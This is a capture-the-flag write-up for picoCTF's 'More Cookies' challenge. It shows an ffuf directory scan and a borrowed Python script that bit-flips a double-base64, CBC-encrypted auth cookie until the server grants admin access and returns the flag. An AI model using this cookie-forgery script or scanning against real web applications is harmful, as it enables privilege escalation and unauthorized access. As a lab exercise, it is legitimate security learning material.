# Overview
This is the target
<img width="1920" height="800" alt="Screenshot_2025-09-30_23-38-02" src="https://github.com/user-attachments/assets/e1e794d1-5915-40ca-bca7-f57bb2597aa8" />

# Action
I need to look for hidden endpoints since the hint clearly stated that there is an endpoint which tell if the user is admin or not

```
ffuf -c -r -u 'http://mercury.picoctf.net:10868/FUZZ' -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
...
search
```
I found the cookie but after I decode with base64, it is still a radom string
<img width="626" height="316" alt="Screenshot_2025-09-30_23-45-20" src="https://github.com/user-attachments/assets/6e1b6a72-9209-458a-a41a-f71cb60f9264" />
<img width="1537" height="506" alt="Screenshot_2025-09-30_23-44-52" src="https://github.com/user-attachments/assets/ebc6709c-b877-4488-86b9-298bbcf590e7" />

Carefully look at the description
<img width="614" height="73" alt="Screenshot_2025-09-30_23-47-30" src="https://github.com/user-attachments/assets/1c22d45f-66b3-4ba8-a31c-2fdd3855f28d" />
C,B,C are capitalized, `CBC` cipher mod? I am gonna assumed so, and I stucked. Luckily, Thank to [HHousen](https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/More%20Cookies/improved_script.py), I got the script that can help me achieve the flag by flipping bit

```

import requests
import base64
from tqdm import tqdm

ADDRESS = "http://mercury.picoctf.net:10868/"

s = requests.Session()
s.get(ADDRESS)
cookie = s.cookies["auth_name"]
# Decode the cookie from base64 twice to reverse the encoding scheme.
decoded_cookie = base64.b64decode(cookie)
raw_cookie = base64.b64decode(decoded_cookie)


def exploit():
    # Loop over all the bytes in the cookie.
    for position_idx in tqdm(range(0, len(raw_cookie))):
        # Loop over all the bits in the current byte at `position_idx`.
        for bit_idx in range(0, 8):
            # Construct the current guess.
            # - All bytes before the current `position_idx` are left alone.
            # - The byte in the `position_idx` has the bit at position `bit_idx` flipped.
            #   This is done by XORing the byte with another byte where all bits are zero
            #   except for the bit in position `bit_idx`. The code `1 << bit_idx`
            #   creates a byte by shifting the bit `1` to the left `bit_idx` times. Thus,
            #   the XOR operation will flip the bit in position `bit_idx`.
            # - All bytes after the current `position_idx` are left alone.
            bitflip_guess = (
                raw_cookie[0:position_idx]
                + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))
                + raw_cookie[position_idx + 1 :]
            )

            # Double base64 encode the bit-blipped cookie following the encoding scheme.
            guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()

            # Send a request with the cookie to the application and scan for the
            # beginning of the flag.
            r = requests.get(ADDRESS, cookies={"auth_name": guess})
            if "picoCTF{" in r.text:
                print(f"Admin bit found in byte {position_idx} bit {bit_idx}.")
                # The flag is between `<code>` and `</code>`.
                print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
                return


exploit()
```
<img width="315" height="104" alt="Screenshot_2025-09-30_23-53-46" src="https://github.com/user-attachments/assets/d278fb6a-8689-4912-b242-6cb08f6393a3" />
Happy Hacking!!!
